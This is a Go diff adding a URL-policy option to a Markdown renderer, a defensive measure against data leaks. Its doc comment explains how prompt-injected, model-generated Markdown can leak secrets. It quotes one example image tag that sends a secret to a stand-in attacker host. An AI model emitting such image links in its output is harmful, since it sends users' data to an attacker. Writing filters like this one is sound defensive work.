@@ -101,7 +101,7 @@ func (b *Builder) Build() *Parser {
 	for _, t := range b.tweaks {
 		t(spec.Renderer)
 	}
-	return newParser(spec, nil, 0)
+	return newParser(spec, nil)
 }
 
 // ---- options ----
@@ -159,6 +159,24 @@ func WithSafeLinks() Option {
 		b.tweak(func(r renderer.Renderer) {
 			if h, ok := r.(*html.Renderer); ok {
 				h.SafeLinks = true
+			}
+		})
+	}
+}
+
+// WithURLPolicy vets every link and image destination with policy before it is
+// written, after the WithSafeLinks scheme check when both are set. Use it to
+// stop model-generated Markdown from loading remote images — the channel a
+// prompt-injected ![](https://attacker.example/?q=secret) leaks data through:
+//
+//	md := mdflow.New(mdflow.WithURLPolicy(html.AllowImageHosts("cdn.example.com")))
+//
+// It applies to the HTML renderer and is ignored by any other.
+func WithURLPolicy(policy html.URLPolicy) Option {
+	return func(b *Builder) {
+		b.tweak(func(r renderer.Renderer) {
+			if h, ok := r.(*html.Renderer); ok {
+				h.URLPolicy = policy
 			}
 		})
 	}
